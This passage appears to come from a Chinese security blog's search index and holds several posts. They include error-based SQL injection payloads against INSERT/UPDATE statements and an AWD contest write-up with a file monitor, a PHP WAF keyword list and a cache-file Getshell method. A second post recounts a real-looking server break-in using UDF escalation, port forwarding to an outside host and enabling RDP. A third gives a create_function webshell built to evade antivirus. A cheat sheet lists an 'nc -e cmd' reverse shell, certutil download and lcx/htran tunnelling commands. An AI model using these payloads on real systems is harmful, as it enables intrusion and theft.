member__sq(p_name,p_number,p_owner,p_ney,sqdate) values( '&#123;$_POST[_name]&#125;','&#123;$_POST[_number]&#125;','&#123;$_POST[_owner]&#125;','&#123;$_ney&#125;','".time()."') "; echo $sql; //insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values('te1st','51','me','test123') and 1=1//','1511233968') $result = mysql_query($sql,$conn); if(mysql_affected_rows()=="-1")&#123; echo "&lt;br&gt;".mysql_error(); &#125;else&#123; echo "sucess!"; &#125; mysql_close(); ?&gt; config.php 12345678910&lt;?php$mysql_server_name='localhost'; //改成自己的mysql数据库服务器 $mysql_username='root'; //改成自己的mysql数据库用户名 $mysql_password='root'; //改成自己的mysql数据库密码 $mysql_database='a'; //改成自己的mysql数据库名?&gt; update注入注入语句12insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values( 'te1st','51','Olivia' or 注入语句 or'','test123','1511241494') -- 单引号也可以换成双引号 使用updatexml()显错来注入这里要说明一下，用updatexml()进行显错注入，有一个条件： 1echo "&lt;br&gt;".mysql_error(); 必须打印mysql_error()才行，如果不打印呢，后面会介绍到。 updatexml函数介绍： 12345UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据 显示MySQL版本1payload:_name=te1st&amp;_number=51&amp;_owner=Olivia' or updatexml(0,concat(0x7c,version()),1) or' 如果不加上concat会只显示.53，concat是字符拼接函数。 查表名1_name=te1st&amp;_number=51&amp;_owner=Olivia' or updatexml(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema = database())),1) or' 查列名1_name=te1st&amp;_number=51&amp;_owner=Olivia' or updatexml(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name = 'member__sq')),1) or' 发现爆列名的时候没把所有列全部输出出来，这里可以用concat代替group_concat只不过要在语句末尾加上limit 0,1 爆数据1_name=te1st&amp;_number=51&amp;_owner=Olivia' or updatexml(0,concat(0x7c,(select concat(p_name,0x7c,p_number) from member__sq where p_id=111)),1) or' 使用extractvalue()报错注入123EXTRACTVALUE (XML_document, XPath_string);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串). extractvalue()和updatexml()类似，只不过extractvalue()只需要两个个参数。 _name=te1st&amp;_number=51&amp;_owner=Olivia&apos; or extractvalue(0,concat(0x7c,(select concat(p_name,0x7c,p_number) from member__sq where p_id=111))) or&apos; tips:extractvalue只能显示32位 1Olivia' or extractvalue(0,concat(0x7c,(select mid(p_name,32,39) from member__sq where p_id=15))) or' -- 需要用mid控制一下位数，updatexml也是这样。 update注入12345UPDATE `member__sq` SET `p_name` = 'updatexxxx'or updatexml(0,concat(0x7c,version()),1) or'',`p_number` =15,`p_owner` = 'me',`p_ney` = 'key',`sqdate` = '2018-11-11' WHERE p_id=1 12345UPDATE `member__sq` SET `p_name` = 'updatexxxx'or extractvalue(0,concat(0x7c,version())) or'',`p_number` =15,`p_owner` = 'me',`p_ney` = 'key',`sqdate` = '2018-11-11' WHERE p_id=1 delete注入 更多闭合方式1234567' or (payload) or '' and (payload) and '' or (payload) and '' or (payload) and '=''* (payload) *'' or (payload) and '" – (payload) – " 补充2018.02.02补充 判断注入判断insert注入，数据包括’ 或者 \时，数据无法插入，则80%是注入，20%是被拦截规则拦截掉了。在开发中，拼接SQL语句一般是： 1$sql = "INSERT INTO student values($stuId,'$stuName',$stuChinese,$stuEnglish,$stuMath)"; 带入数据库的字符串是用’ 包裹的，测试数据中带有”，如果能插入数据则90%是注入(“ 不影响数据库执行的sql语句的闭合。往数据库里面插入双引号会变成单引号)。 将测试数据中包含\’ 如果能插入数据，则 100% 证明存在注入。方法(2) 或者插入sleep(5) 延时5秒进入页面，也可以判断存在注入。 判断update注入，检测方法同上。 如果是一个数字参数，则只能用方法(2)进行判断。 巧用回显进行注入insert注入中判断列的个数： 在提交的数据后添加,’ ‘,’ ‘);– 后面有多少个’ ‘,就代表后面还有多少个列。 注入数据： 1payload ： _name=bbss','',(select password from users) ,'',''); -- /*后面要加一个空格，否则MySQL容易识别成减号*/ update注入： 新的测试代码insert_update_injectionCode]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>3种特殊方式注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>insert注入</tag>
        <tag>extractvalue注入</tag>
        <tag>delete注入</tag>
        <tag>updatexml注入</tag>
        <tag>update注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWD西石油线下赛总结]]></title>
    <url>%2FAWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[先放上成绩(第一名)，然后开始总结17年西石油的攻防赛。 线下赛漏洞挖掘思路 No1. Getshell，然后curl flag机获取flag No2. 代码执行 或者 命令执行漏洞来直接获取flag No3. 高权限注入执行命令获取flag No4. PHP对file操作的函数获取flag(url_fopen_allow=On) 堡垒机防护linux_file_check.py通过find -name “*.php” -mmin -3来对linux文件进行监控(已用py2实现)，防止有shell传上去，在没有挖掘到漏洞的时候也可以得知大佬们的shell路径及密码；还可以根据shell来判断受到的攻击方式。 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/python#coding=utf-8#Usage ：python demo.py#Code by : AdminTony#Blog : http://www.admintony.com#注意：要将此文件放在有读写权限的目录以及所有修改过的php必须在此目录或者该目录的子目录中。#作用：读取被修改过的文件，然后将文件的地址加上内容全部存放在txtimport sys,subprocess,os#查找最近10分钟被修改的文件def scanfile(): #command: find -name '*.php' -mmin -10 command = "find -name \'*.php\' -mmin -10" su = subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE) STDOUT,STDERR = su.communicate() list = STDOUT.split("\n") #print str(list) #将文件处理成list类型然后返回。 return list#读取文件：def loadfile(addr): data = "" #如果文件不存在就跳出函数 try : file = open(addr,'r') data = file.read() except : return 0 all_data = addr+"\n"+data+"\n\n" file1 = open("shell.txt",'a+') #避免重复写入 try: shell_content = file1.read() except: shell_content = "null" #如果文件内容不为空再写入，避免写入空的。 #print shell_content if data : if all_data not in shell_content: file1.write(all_data) file.close() file1.close() rm_cmd = "rm -rf "+addr su = subprocess.Popen(rm_cmd,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE) su.communicate() print "loadfile over : "+addrif __name__ == '__main__': while True: list = scanfile() if list : for i in range(len(list)): #如果list[i]为空就不读取了 if list[i]: loadfile(str(list[i])) else : pass PHPWafPHPWaf用来记录访问请求，通过分析访问请求来判断对方的攻击方式，作用是感知漏洞，判断攻击方式，从而修复漏洞。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phperror_reporting(0);define('LOG_FILENAME', 'log.txt');function waf() &#123; if (!function_exists('getallheaders')) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))) ] = $value; &#125; return $headers; &#125; &#125; $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER["REMOTE_ADDR"]; $method = $_SERVER['REQUEST_METHOD']; $filepath = $_SERVER["SCRIPT_NAME"]; //rewirte shell which uploaded by others, you can do more foreach ($_FILES as $key =&gt; $value) &#123; $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); file_put_contents($_FILES[$key]['tmp_name'], "virink"); &#125; unset($header['Accept']); //fix a bug $input = array( "Get" =&gt; $get, "Post" =&gt; $post, "Cookie" =&gt; $cookie, "File" =&gt; $files, "Header" =&gt; $header ); //deal with $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"; $pattern.= "|file_put_contents|fwrite|curl|system|eval|assert"; $pattern.= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"; $pattern.= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"; $vpattern = explode("|", $pattern); $bool = false; foreach ($input as $k =&gt; $v) &#123; foreach ($vpattern as $value) &#123; foreach ($v as $kk =&gt; $vv) &#123; if (preg_match("/$value/i", $vv)) &#123; $bool = true; logging($input); break; &#125; &#125; if ($bool) break; &#125; if ($bool) break; &#125;&#125;function logging($var) &#123; file_put_contents(LOG_FILENAME, "\r\n" . time() . "\r\n" . print_r($var, true) , FILE_APPEND); // die() or unset($_GET) or unset($_POST) or unset($_COOKIE); &#125;waf();?&gt; waf的激活方式： 1.php.ini选项：auto_prepend_file =与auto_append_file =包含waf，需要权限较高。 2.config.php 中包含waf 3.让所有的文件都包含waf 使用waf一定要记得：看waf和cms的命名空间是否冲突，否则一包含waf则全站500. 代码审计(漏洞挖掘)WEB1 : weiphp4.0beta_20170720_2005 | weiphp的最新版本。 WEB2 : OneThink v1.1 WEB3 : ECSHOP 20170608 先百度看下有没有现成的漏洞可以利用： WEB1 可能存在注入，但是Seebug的漏洞看不了，然后看了下WEB1的config，还是root权限，waf和cms的命名空间冲突了，无法启用waf。很有可能是高权限注入来Getflag WEB2 有一个前台代码执行漏洞是今年8月份提交的，也是无权查看，还有一个前台Getshell的，看了下是利用缓存文件来Getshell的。这时候主办方也给tips说漏洞和今年的thinkphp的缓存有关。 WEB1和WEB2都是基于thinkphp框架的，可能两个站点都存在这个漏洞，先做WEB2吧，上面有案例，可以做的快一点： 利用方式是注册一个账户然后登陆，cms会将登陆成功的用户记入缓存，那么创建eval($_POST[X]);// 用户即可GETSHELL，注册不显示是否成功，注册完以后登陆发现用户不存在，多次测试后发现，用户名有长度限制，username&lt;16。且所有登陆成功的用户都会记入同一个缓存文件。所以注册两个用户php $x=$_GET[X];和php eval($x);// 缓存文件的格式是： 123&lt;?php//000000000000a:1:&#123;s:2:"u1";s:13:"Administrator";&#125;?&gt; 所以需要换行，否则一直在注释里面，且需要注释掉后面的内容，否则会报错 在提交的时候URL-encode 必须勾选上再提交，否则会把换行符的url-encode当成字符串来处理。 登陆的时候也需要抓包，在用户名前面加上换行符的URL-encode，且勾选上URL-encode 登陆成功则会记录在缓存文件中， eval($a);// 同理 理论上我已经拿到shell了，但是缓存文件名是什么？查阅了thinkphp的开发文档发现data_cache_key控制缓存文件名，如果不定义这个key则缓存文件名会一样。其实我当时是改了下ip看别人堡垒机上也有这个文件才知道缓存文件名一样的，这个key是后来查的。 修复方法： 1.打开文件：thinkphp\library\think\cache\driver\File.php 2.找到：public function set($name, $value, $expire = null) 方法 3.添加：$data = str_replace(PHP_EOL, &apos;&apos;, $data); WEB1也是基于thinkphp的会不会也有这个漏洞？ 只能由字母数字_组成，估计是不行了。 WEB1代码中发现minify.php文件有问题： 通过审计发现：web1中minify文件的$f参数未经过过滤就放入了readfile，根据PHP官方文档知道 如果在 php.ini 文件中 &quot;fopen wrappers&quot; 已经被激活，则在本函数中可以把 URL 作为文件名来使用。 所以这里可以构造payload来试用readfile函数来读取flag。因为代码中要求读取文件的后缀必须是css或者js的，所以payload=minify.php?f=http://127.0.0.1/?a.js把a.js当作参数。最终可以达到getflag的效果。 WEB3的漏洞没审计出来。 赛后总结 waf的参数要避开cms的命名空间，否则会导致整站崩溃。 waf必须让所有php包含，否则就会像这次一样，他们抓不到我们的流量，从头到尾只有一个队抓到流量了补了洞。 以后的学习中多注意对file操作的函数，比赛中可能会用上。]]></content>
      <categories>
        <category>比赛</category>
        <category>攻防赛</category>
        <category>西石油AWD总结</category>
      </categories>
      <tags>
        <tag>AWD</tag>
        <tag>攻防赛</tag>
        <tag>攻防赛总结</tag>
        <tag>线下赛</tag>
        <tag>西石油</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[突破不支持PHP脚本进行MySQL提权]]></title>
    <url>%2F%E7%AA%81%E7%A0%B4%E4%B8%8D%E6%94%AF%E6%8C%81PHP%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8CMySQL%E6%8F%90%E6%9D%83.html</url>
    <content type="text"><![CDATA[1.说明本文首发T00ls，原本在博客上也有的，重建了博客，加上这次迁移博客到github上面，图片丢失了，图片全部从T00ls上面拿的。下面请欣赏故事！ 2.提权前信息收集2.1 菜刀是否可以执行cmd命令 2.2 支持哪些脚本探测结果： 支持aspx (aspx可以执行cmd) 不支持PHP (直接原样输出代码) 2.3 ASPX中CMD的权限 2.4 系统版本 2.5 端口开放情况 开启的端口 21 80 135 445 1025 1030 3306 3311 3312 3313 5555 3312是kangle这个程序的端口，并且kangle程序的管理后台是php脚本的，为何站点不支持php呢？先放一放！5555未知端口，很有可能是远程端口 2.6 进程情况 服务器上面存在云锁 和 360 ，防护软件倒是不少! 再看下teamserivice的PID 返回netstat -ano 看端口的PID 结论： 存在防护软件：云锁 、 360 远程端口没开启 2.7 IP探测 2.8 目录探测 serv-U 和 MySQL可能能够利用! 2.9 思路总结 思路1 ： network service+windows2003 –&gt;pr秒杀！–&gt;由于有云锁和360，失败可能性极大 思路2 ： servu提权—&gt;servu的端口也可能是5555 思路3 ： mysql的root解密，用udf或者mof提权！ 3.开始提权3.1 思路1 PR提权失败，其实到这里可以猜测到用EXP基本上都会失败，毕竟有两个杀软嘛。 3.2 思路2先探测一下服务，看看是不是有servu的服务，免得到头来白费劲 并未找到serv-U的服务! 但是看到了MySQL的服务 3.3 思路3由系统服务看到了这么一串代码： &quot;C:Program FilesMySQLMySQL Server 5.1binmysqld&quot; --defaults-file=&quot;C:Program FilesMySQLMySQL Server 5.1my.ini&quot; MySQL 百度了一下知道： 这是将数据库和mysql主程序分离的手段，但是my.ini中一样暴露了mysql的数据路径：ps:搜索datadir就可以找到数据地址！ 去找root密码吧！ 下载user.MYD成功解密了root的密码！但是问题来了，不支持php，我如何去连接mysql数据库呢？ 3.4 思考方法 1.aspx大马—&gt;我仔细看了一遍我有的aspx大马，里面都只是支持mssql和access语句执行，并不支持mysql！ 2.菜刀的数据库管理连接mysql数据库！结果如下： 4.踏上走向寻找kangle的道路因为我以前博客的空间是朋友用kangle搭建给我的，所以对kangle有所了解！ kangle后台存放于3312端口，页面如下： 这是我朋友博客的一个截图，通过这个截图可以看出，kangle的后台存放于一个vhost的文件夹下，翻翻目录： 找到了vhost了，并且将大马写入！访问目标站点的3312端口： 很有可能这个端口开放在内网！那好办，上lcx.exe将3312转发到我博客的服务器： 然后访问admintony.top的3312–&gt;这里我博客的lcx将51的流量转发到了3312！ps：各位大牛高抬贵手，不要搞我博客哦，这里就不打码了！(现在博客地址是:admintony.com)然后访问大马： ok，访问到我的php大马了！进去执行命令： 可以执行命令，直接上udf提权 提升到system权限了，顺利加了用户 5.开3389现在经过T00ls的前辈们的指导，我开3389已经轻车熟路了，很好办的： 貌似是失败了，看3389，的确没开！ 换命令： wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1 这个命令在大马里面执行不了,因为貌似这个大马过滤%，上次就是这种情况，只能反弹shell了！ 反弹shell出了问题 : 到这里有点焦急了，因为怕直接用php大马的反弹连接反弹的shell不是system权限还是无法开启远程端口，先试试吧，不行了再想办法： 还好，反弹来的shell是system权限！ 执行命令失败了！又翻了一下之前在论坛发的开3389求助贴，然后试了下另外一条命令： REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 操作完成，估计是开了吧！ 3389开了，直接一个转发，就可以连接到目标服务器了！]]></content>
      <categories>
        <category>渗透测试</category>
        <category>提权</category>
        <category>MySQL_UDF提权</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>MySQL提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python命令行模块optparse学习记录]]></title>
    <url>%2FPython%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%9D%97optparse%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.html</url>
    <content type="text"><![CDATA[1.模块简介optparse 是python的一个命令行模块，它提供了强大的命令行参数处理功能，并且十分简易，容易上手。 2.Demo：1234567891011#!/usr/bin/python#coding=utf-8import optparseusage="%prog [option] file"parse = optparse.OptionParser(usage)parse.add_option('-f','--file',action='store', dest="fl",help="file",metavar="FILE",default='a.txt')parse.add_option('-v','--version',action='store_true')(options,args)=parse.parse_args()print options.fl,options.version 3.简单流程先引入optparse模块，然后创建一个optparse.OptionParser()对象(opt)，使用add_option()方法来定义参数列表，定义好参数以后调用parse_args()来解析程序命令行，返回一个元组，其中从命令行取得的参数值放在元组的第一个变量中。 123456import optparseopt=optparse.OptionParse()opt.add_option(......)(options,args)=opt.parse_args()..... 4.简介add_option的参数123456789101112add_option('-f','--file',help="this is read file",dest="file1",default='a.txt',action='store',type="string",metavar="FILE")""" 参数介绍'-f'短参数名'--file'长参数名[可选]help:参数描述dest:文件名，若没这个选项则为参数名default:默认值action:当程序出现参数名的时候该如何处理，其值有store存储，store_true存储true，store_false存储falsetype:参数值的数据类型metavar:有助于提醒用户，该命令行参数所期待的参数"""]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Python学习</tag>
        <tag>命令行模块</tag>
        <tag>optparse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式学习]]></title>
    <url>%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[1.正则表达式正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。在Pyhon中有re模块提供正则表达式。 2.正则表达式基础2.1 子模式\w : 匹配任意字母、数字 或者 _ \d : 匹配数字 \s : 匹配空白符号(空格、Tab等) . : 匹配任意字符 2.2 重复子模式\d* : 表示任意个数字，包括0个 \w+ : 表示匹配至少一个字母、数字 或者 _ \w{3:8} : 表示匹配3-8之间个字母、数字 或者 _ 2.3 “或” 运算 ： |(p|P)ython : 可以匹配python 也可以匹配Python 2.4 选择符 ： ?(http://)?(www.)?(admintony.com) ：可以匹配http://admintony.com \ http://www.admintony.com \ www.admintony.com \ admintony.com (也就是：字符串中必须存在最后一个元组才能被匹配到) 2.5 字符集 ： [][a-zA-Z0-9\_] : 等价于\w [0-9a-zA-Z\.\_] : 匹配数字、字母、. 和 _ 2.6 开始符和结尾符 ： ^ 、 $^\d : 以数字开始 \w$ ：以字母结尾 ^[a-zA-Z][0-9a-zA-Z\_]* : 匹配python的合法变量 2.7 分组 : ()2.7.1 捕获组(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名 2.7.2 非捕获组(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名 (?:\d+\.){3}\d+ : 匹配IP 3.Python的re模块 3.1 re模块的用法123456789import restr = "xxxflag&#123;xxx&#125;xxx"# 用法1：re_flag = re.compile(r'flag&#123;\w+?&#125;')flag = re_flag.findall(str)# 用法2：flag = re.findall(r'flag&#123;\w+?&#125;',str) 3.2 贪婪匹配和非贪婪匹配 贪婪模式下 ：正则表达式想匹配最多的元素 非贪婪模式下：尽可能少的匹配 3.3 match 和 search的区别 match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None search 匹配整个字符串，直到找到一个匹配 3.4 分组匹配]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Python学习</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小技巧应对MYSQL的root用户没有file权限]]></title>
    <url>%2F%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%BA%94%E5%AF%B9MYSQL%E7%9A%84root%E7%94%A8%E6%88%B7%E6%B2%A1%E6%9C%89file%E6%9D%83%E9%99%90.html</url>
    <content type="text"><![CDATA[一个应对MYSQL的root用户没有file权限的小技巧，可能在实战中会用到 测试环境： phpmyadmin 3.1.0.2 MYSQL 5.5.25 测试用户root，没有file权限条件： 有对mysql数据库user表的update权限方法：1UPDATE user set File_priv ='Y'; 将所有的MYSQL用户的file权限全部开启了，1flush privileges; 然后刷新一下权限即可。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>SQL注入</tag>
        <tag>PHPmyAdmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过狗一句话编写之代码执行漏洞函数代替eval]]></title>
    <url>%2F%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BFeval.html</url>
    <content type="text"><![CDATA[1.说明tips : 补发一个之前写的过狗一句话，当时有发在博客和t00ls，由于博客重建了，就从t00ls copy过来吧。 2.起因及过狗原理今天下午看坛友发了一个求助贴，让帮忙分析一句话木马呢！ 原帖链接：https://www.t00ls.net/thread-36667-1-1.html 帖子二楼的大牛分析的很到位，那个一句话木马用了函数回调的方法，传递一个存在代码执行漏洞的函数preg_replace来代替eval执行代码 然后我就想着，安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现 ，正常的POST数据不拦截，小弟的认识 说的不对的地方还望大牛指正。 然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。 3.过狗SHELL编写因此就想着试一试~选择的函数是create_function函数，这个函数曾在wordpress最近的代码执行漏洞中是罪魁祸首，我刚好复现过wordpress那个代码执行漏洞，对create_function比较熟悉(原帖地址：https://www.t00ls.net/thread-36509-1-1.html) create_function函数接收两个参数$args 和 $code 然后组成新函数function_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行了。 构造$code 1$code = "n;&#125;$_POST[x];/*"; 解释一下构造的$code: 双引号中$_POST[x]被执行(这里以提交x=phpinfo();为例)1234567;来结束语句&#125;来结束函数体phpinfo();;就在函数体外面被eval执行了/*注释多余的代码 最终代码： 1eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;) 那么phpinfo()就被执行了. 如图： 过狗测试： 4.最终代码最终代码： 12345&lt;?php $args = "tony"; $code = "n;&#125;$_POST[x];/*"; echo create_function('$args',$code);?&gt;]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Bypass系列</category>
        <category>Bypass SHELL</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>过狗SHELL</tag>
        <tag>免杀SHELL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好文章收集]]></title>
    <url>%2F%E5%A5%BD%E6%96%87%E7%AB%A0%E6%94%B6%E9%9B%86.html</url>
    <content type="text"><![CDATA[tips：记录一些记不住的套路 注册表 bypassUAC 加用户 https://www.t00ls.net/thread-43711-1-1.html #可以用在system权限无法添加用户的情况 cmd上传文件的N种方法 https://www.t00ls.net/articles-37253.html1certutil -urlcache -split -f https://www.baidu.com/img/bd_logo1.png D:\x.txt 自定义目录下载 乙方渗透测试之fuzz爆破 http://www.cnnetarmy.com/乙方渗透测试之fuzz爆破/渗透测试岗位笔试题 https://www.t00ls.net/viewthread.php?tid=41627URL跳转绕过 https://www.t00ls.net/thread-43001-1-1.htmlWord漏洞 CVE-2017-11882 POC https://www.t00ls.net/viewthread.php?tid=42734nmap用法:http://www.91ri.org/8516.html php代码混淆解析站：https://www.unphp.netoffice-vulnerability-cve-2017-11882 http://blog.hflsafe.cn/2017/11/22/office-vulnerability-cve-2017-11882/域渗透前置知识http://twi1ight.com/2016/04/basics-of-active-directory-hacking/#more利用 ew 轻松穿透目标多级内网web全套资料 干货满满 各种文章详解 MSSQL不使用xp_cmdshell执行命令并获取回显的两种方法 突破防火墙和脚本限制建立代理隧道git clone 地址git add README.mdgit commit -m “first commit”git push -u origin master git initgit remote add origin https://github.com/admintony/insert_update_injectionCode.git 删除指定文件：git clone 地址git rm -r –cached 文件名 git push -u origin masternc使用： nc.exe -e cmd remoteIP Port nc.exe -vv -lp Portlcx使用： lcx.exe -slave remoteIP RPort localIP Port lcx.exe listen RPort LPorthtran正向代理服务端 htran.exe -s -bind 8888客户端 SocksCap:SOCKS Version 5 服务端IP:8888 反向代理客户端 htran.exe -s -listen 1234 8888服务端 htran.exe -s -connect 客户端IP 1234客户端 SocksCap:SOCKS Version 5 127.0.0.1:8888 正向端口转发服务端 htran.exe -p -tran 8888 127.0.0.1 3389客户端 RDP 服务端IP:8888 反向端口转发客户端 htran.exe -p -listen 1234 8888服务端 htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389客户端 RDP 127.0.0.1:8888 python reGeorgSocksProxy.py -u http://targetURL/tunnel.nosocket.php -p 233nmap的基础用法：nmap -sP 10.10.4.0/24 -oS nmap.txt #扫描存活主机，并存放在namp.txtnmap -sT 10.10.4.16 -v -oS nmap.txt #扫描某个ip的开放端口namp -sT 10.10.4.0/24 -v -oS namp.txt #扫描网段的主机并且扫描存活主机的端口 iis6远程代码执行工具iis6远程代码执行工具shellshock利用工具ViewStateDecoder2.0 ViewState解密zfdumper 正方教务系统利用工具抓取mstsc保存的密码 最详细的python+selenium教程 SQL注入中过滤了一些字符之后进行注入的方法：12345678910 and Polygon(id) #爆表名 #~ error:Illegal non geometric '`库名`.`当前页面连接的表名`.`所填字段名`' value found during parsing #这里的字段必须在这个表中存在 ，如注入点为?id=123则id存在几率较高。 1-a(); #爆库名 #~ error:FUNCTION 库名.a does not exist 版本5.6.x以上可以用下面的表代替information_schema,select * from mysql.innodb_table_stats;select table_name from mysql.innodb_table_stats where database_name 绕过IDS过滤information_schema继续注入 重装系统后恢复博客1.安装Git Bash 下载地址 安装步骤：双击下载好的EXE文件，一路next就好 2.安装NodeJs 下载地址 （说明:LTS为长期支持版，Current为最新版） 安装步骤：下载好msi文件后，双击打开安装，也是一路next 3.安装hexo 在博客目录下执行npm i -g hexo 4.搭桥GitHub 配置gitbashgit config --global user.name &quot;admintony&quot; 和 git config --global user.email &quot;78941695@qq.com&quot; 创建公钥ssh-keygen -t rsa -C &quot;78941695@qq.com&quot; （注意：id_rsa默认目录，然后复制到blog目录下） github添加公钥 测试连接ssh -T git@github.com 5.搜索插件 安装搜索插件：npm install hexo-generator-search --save &amp;&amp; npm install hexo-generator-searchdb --save 6.安装字数统计插件 npm i --save hexo-wordcount 7.安装sitemap插件 npm install hexo-generator-sitemap --save-dev npm install hexo-generator-baidu-sitemap --save-dev 8.安装置顶插件 npm uninstall hexo-generator-index --save npm install hexo-generator-index-pin-top --save 9.自动推送 npm install hexo-baidu-url-submit --save 如何创建../../a.php的压缩包创建一个名为aaaaaaindex.php的文件之所以起这个名字，就是预留一些空间，方便我之后将文件名改成../../index.php，而不用怕字符串长度不对。 压缩为压缩文件并用notepad++打开 修改两处名称，并保存把前面6个a替换成../../]]></content>
  </entry>
</search>
